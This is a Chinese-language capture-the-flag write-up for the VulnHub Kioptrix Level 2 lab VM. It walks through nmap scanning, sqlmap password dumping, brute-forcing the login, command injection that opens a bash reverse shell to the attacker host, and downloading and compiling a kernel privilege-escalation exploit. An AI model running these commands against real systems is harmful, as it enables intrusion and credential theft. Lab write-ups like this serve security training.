@@ -1,0 +1,275 @@
+> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/8IjzWE3nX4wTXl6z3ao4gg)
+
+![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/1brjUjbpg5woLxm1R7bkgS0xELvt3I75r1nOjBycGwcBqCoO4AtB7FQNfiasb7z3JWibPtaeZussh9jnKKmOECmg/640?wx_fmt=png)
+
+点击上方 “信安前线” 可订阅
+
+**0x01 介绍**
+-----------
+
+虚拟机下载页面：https://download.vulnhub.com/kioptrix/Kioptrix_Level_2-update.rar
+
+Description
+
+> This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.
+
+**0x02 Writeup**
+----------------
+
+#### 1 主机发现与信息收集
+
+##### 1.1 端口信息扫描
+
+nmap 扫描开放端口
+
+```
+ root@kali:~# nmap -sS -sV -p 1-65535 -T4 192.168.0.7
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQTkFnia05Xe1HF4RMNl73VxCib78PEZeQDnkeWpDPY3onliaxaAFOcpWcEBaKDIrxibL9oDOyxmTwIIvw/640?wx_fmt=png)
+
+##### 1.2 主机漏洞信息扫描  
+
+nmap 漏洞脚本库：
+
+```
+ root@kali:~# nmap --script=vuln -p 22,80,111,443,610,613,3306 192.168.0.7
+ Starting Nmap 7.80 ( https://nmap.org ) at 2021-03-25 09:37 EDT
+ Pre-scan script results:
+ | broadcast-avahi-dos:
+ |   Discovered hosts:
+ |     224.0.0.251
+ |   After NULL UDP avahi packet DoS (CVE-2011-1002).
+ |_ Hosts are all up (not vulnerable).
+ Nmap scan report for 192.168.0.7
+ Host is up (0.00030s latency).
+ 
+ PORT     STATE SERVICE
+ 22/tcp   open   ssh
+ |_clamav-exec: ERROR: Script execution failed (use -d to debug)
+ 80/tcp   open   http
+ |_clamav-exec: ERROR: Script execution failed (use -d to debug)
+ | http-csrf:
+ | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.0.7
+ |   Found the following possible CSRF vulnerabilities:
+ |
+ |     Path: http://192.168.0.7:80/
+ |     Form id: frmlogin
+ |     Form action: index.php
+ |
+ |     Path: http://192.168.0.7:80/index.php
+ |     Form id: frmlogin
+ |_   Form action: index.php
+ |_http-dombased-xss: Couldn't find any DOM based XSS.
+ | http-enum:
+ |   /icons/: Potentially interesting directory w/ listing on 'apache/2.0.52 (centos)'
+ |_ /manual/: Potentially interesting folder
+ |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+ |_http-trace: TRACE is enabled
+ |_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
+ 111/tcp open   rpcbind
+ |_clamav-exec: ERROR: Script execution failed (use -d to debug)
+ 443/tcp open   https
+ |_clamav-exec: ERROR: Script execution failed (use -d to debug)
+ |_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)
+ |_http-csrf: Couldn't find any CSRF vulnerabilities.
+ |_http-dombased-xss: Couldn't find any DOM based XSS.
+ |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+ |_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)
+ | ssl-ccs-injection:
+ |   VULNERABLE:
+ |   SSL/TLS MITM vulnerability (CCS Injection)
+ |     State: VULNERABLE
+ |     Risk factor: High
+ |       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
+ |       does not properly restrict processing of ChangeCipherSpec messages,
+ |       which allows man-in-the-middle attackers to trigger use of a zero
+ |       length master key in certain OpenSSL-to-OpenSSL communications, and
+ |       consequently hijack sessions or obtain sensitive information, via
+ |       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
+ |
+ |     References:
+ |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
+ |       http://www.cvedetails.com/cve/2014-0224
+ |_     http://www.openssl.org/news/secadv_20140605.txt
+ | ssl-dh-params:
+ |   VULNERABLE:
+ |   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)
+ |     State: VULNERABLE
+ |     IDs: CVE:CVE-2015-4000 BID:74733
+ |       The Transport Layer Security (TLS) protocol contains a flaw that is
+ |       triggered when handling Diffie-Hellman key exchanges defined with
+ |       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker
+ |       to downgrade the security of a TLS session to 512-bit export-grade
+ |       cryptography, which is significantly weaker, allowing the attacker
+ |       to more easily break the encryption and monitor or tamper with
+ |       the encrypted stream.
+ |     Disclosure date: 2015-5-19
+ |     Check results:
+ |       EXPORT-GRADE DH GROUP 1
+ |             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA
+ |             Modulus Type: Safe prime
+ |             Modulus Source: mod_ssl 2.0.x/512-bit MODP group with safe prime modulus
+ |             Modulus Length: 512
+ |             Generator Length: 8
+ |             Public Key Length: 512
+ |     References:
+ |       https://weakdh.org
+ |       https://www.securityfocus.com/bid/74733
+ |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000
+ |
+ |   Diffie-Hellman Key Exchange Insufficient Group Strength
+ |     State: VULNERABLE
+ |       Transport Layer Security (TLS) services that use Diffie-Hellman groups
+ |       of insufficient strength, especially those using one of a few commonly
+ |       shared groups, may be susceptible to passive eavesdropping attacks.
+ |     Check results:
+ |       WEAK DH GROUP 1
+ |             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA
+ |             Modulus Type: Safe prime
+ |             Modulus Source: mod_ssl 2.0.x/1024-bit MODP group with safe prime modulus
+ |             Modulus Length: 1024
+ |             Generator Length: 8
+ |             Public Key Length: 1024
+ |     References:
+ |_     https://weakdh.org
+ | ssl-poodle:
+ |   VULNERABLE:
+ |   SSL POODLE information leak
+ |     State: VULNERABLE
+ |     IDs: CVE:CVE-2014-3566 BID:70574
+ |           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
+ |           products, uses nondeterministic CBC padding, which makes it easier
+ |           for man-in-the-middle attackers to obtain cleartext data via a
+ |           padding-oracle attack, aka the "POODLE" issue.
+ |     Disclosure date: 2014-10-14
+ |     Check results:
+ |       TLS_RSA_WITH_AES_128_CBC_SHA
+ |     References:
+ |       https://www.securityfocus.com/bid/70574
+ |       https://www.imperialviolet.org/2014/10/14/poodle.html
+ |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
+ |_     https://www.openssl.org/~bodo/ssl-poodle.pdf
+ |_sslv2-drown: ERROR: Script execution failed (use -d to debug)
+ 610/tcp open   npmp-local
+ |_clamav-exec: ERROR: Script execution failed (use -d to debug)
+ 613/tcp closed hmmp-op
+ 3306/tcp open   mysql
+ |_clamav-exec: ERROR: Script execution failed (use -d to debug)
+ |_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)
+```
+
+##### 1.3 web 应用方面
+
+应用版本信息：
+
+![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQTkFnia05Xe1HF4RMNl73VxCjYtllXdhG6361ib8zRCc2qF9iaXrKqmm6V6ibnA8D3CTrrX0avlvRIbzQ/640?wx_fmt=png)
+
+目录扫描：  
+
+![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQTkFnia05Xe1HF4RMNl73VxCBicnmkRianljM2oVAicZwuK9XWbyt6LxXu3mPicXFSggbd0mSceZ1myxicQ/640?wx_fmt=png)
+
+除了扫描到 apache 默认 manual 目录未发现其他可疑路径，还有一个首页登录地址接下来思路为对其进行测试。  
+
+#### 2 Flag 获取
+
+##### 2.1 getshell
+
+访问 80 网站首页为一个系统登录页面，测试 sql、xss、暴力猜解等漏洞。
+
+###### 2.1.1 sql 注入
+
+使用 burp 抓取 post 包，再使用 sqlmap 注入
+
+```
+ root@kali:~# sqlmap -r post.txt --dbms=mysql --level 5 --risk 3 --is-dba --passwords --dbs --current-db
+ root@kali:~# sqlmap -r post.txt --dbms=mysql --level 5 --risk 3 --tables -D "webapp"
+ root@kali:~# sqlmap -r post.txt --dbms=mysql --level 5 --risk 3 --columns -T "users" -D "webapp"
+ root@kali:~# sqlmap -r post.txt --dbms=mysql --level 5 --risk 3 --dump -C "id,username,password" -T "users" -D "webapp"
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQTkFnia05Xe1HF4RMNl73VxCbTbu8T5j8HJS6vXIvLkg1fWqLabEIndNJQnmLELK6PuK6Q4lotpBUw/640?wx_fmt=png)
+
+```
+ root@kali:~# sqlmap -r post.txt --dbms=mysql --level 5 --risk 3 --users --passwords
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQTkFnia05Xe1HF4RMNl73VxCKcUz7VfA5MaWjsMdufyQODzNLRBbbFa7ZG1OmSp6s5qAUicKnvNIqAg/640?wx_fmt=png)
+
+登录后台  
+
+![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQTkFnia05Xe1HF4RMNl73VxCAgaS9T8LedNfP0LNhaxNQl6z2LLbEb2EJRTMp2wotMfOCm07bH8rHQ/640?wx_fmt=png)
+
+看到此页面熟悉的页面，推测此处存在命令执行漏洞；  
+
+![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQTkFnia05Xe1HF4RMNl73VxCWQ3SiapLS9QdK1JIQACnicnSA2w1QZSmHcuIZ3NQoLcianPvXicmiaEdhgw/640?wx_fmt=png)
+
+直接拿取 webshell  
+
+![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQTkFnia05Xe1HF4RMNl73VxCFP6WEiabuf5tH6Bjic1R5noIb7xcrqZUL5365gGbmQ0rAQaWHr6M2YGQ/640?wx_fmt=png)
+
+由于 html 文件夹只有 root 权限可写，当前 apache 权限无写入，所以无法写入 webshell。  
+
+###### 2.1.2 口令猜解
+
+登录处无验证码可尝试使用 burp 暴力猜解口令
+
+![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQTkFnia05Xe1HF4RMNl73VxCJWXibbhZlsJD5LMicxOCytVaA1Qiaib86e35nL2CYrKloy6IJbALgDyFfQ/640?wx_fmt=png)
+
+爆破出账户口令，登录账户  
+
+![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQTkFnia05Xe1HF4RMNl73VxCVvIZZhL1UCOGbdSxr0AdRntU1qF1hZrH2Ba18vrS3cWzSRMTr49vCw/640?wx_fmt=png)
+
+##### 2.2 权限提升  
+
+###### 2.1.1 shell 反弹
+
+现在 kali 监听 4343 端口，再在网站后台处执行端口反弹
+
+```
+ 127.0.0.1 | bash -i >& /dev/tcp/192.168.0.9/4343 0>&1
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQTkFnia05Xe1HF4RMNl73VxCXuXTKookGaicW63FarbzuNf64nUzCc93wPV1Gj7DT7q5d4HHMv7sk9A/640?wx_fmt=png)
+
+收集系统信息  
+
+```
+ uname -a
+ cat /etc/redhat-release
+ cat /etc/crontab
+ crontab -l
+ ……
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQTkFnia05Xe1HF4RMNl73VxCRMon8oM9dcRFmbfbY9yiasXbtewa5TBapFjt6FFQrVChlGaHNdpjnTw/640?wx_fmt=png)
+
+###### 2.1.12 内核提权  
+
+在 exploit-db 上搜索内核为 2.6.9 的本地权限提升 exp
+
+https://www.exploit-db.com/exploits/9542
+
+```
+ wget http://192.168.0.9/9542.c
+ gcc 9542.c -o 9542
+ chmod +x 9542
+ ./9542
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQTkFnia05Xe1HF4RMNl73VxCUGiaCZqz6mibvjKFOaSicXYmcrdLff9wUFLAZaZU5t8VE34yhvTAsgHzA/640?wx_fmt=png)
+
+找了半天未找到 flag，无声的哭泣！！！
+
+更多精彩
+
+*   [Web 渗透技术初级课程介绍](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247486030&idx=2&sn=185f303a2f1b5267c0865f117931959d&chksm=fcfc3718cb8bbe0e6f3ca97859e78342852537da2bef3cd76a83cb90ee64a8ca8953b35aa67e&scene=21#wechat_redirect)
+    
+*   [vulnhub 之 Warzone: 1 靶场 Writeup](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247486924&idx=1&sn=f1d4f630e9a49260b375384c14af2348&chksm=fcfc309acb8bb98c7fd2c75e0a1b5597ee53b9c7b07cd801d6a29451c248fa2ee8c5792f1f4c&scene=21#wechat_redirect)  
+    
+*   [商务合作](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247486808&idx=1&sn=f50f15f9a3ab7312a08b1f932292faca&chksm=fcfc300ecb8bb918213c6070d864ffcd70ad27ab6525521c31e9ccaa57bdfa2968360ed7e8fe&scene=21#wechat_redirect)
+    
+
+![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQSd9wDlUiar0tUpHCYAzrZfTzOvS2SEw9cia9j7d1HKP2bWArPLCegs1XoejVUPu0GkSuZh7Wia7aExA/640?wx_fmt=png)
+
+**如果感觉文章不错，分享让更多的人知道吧！**
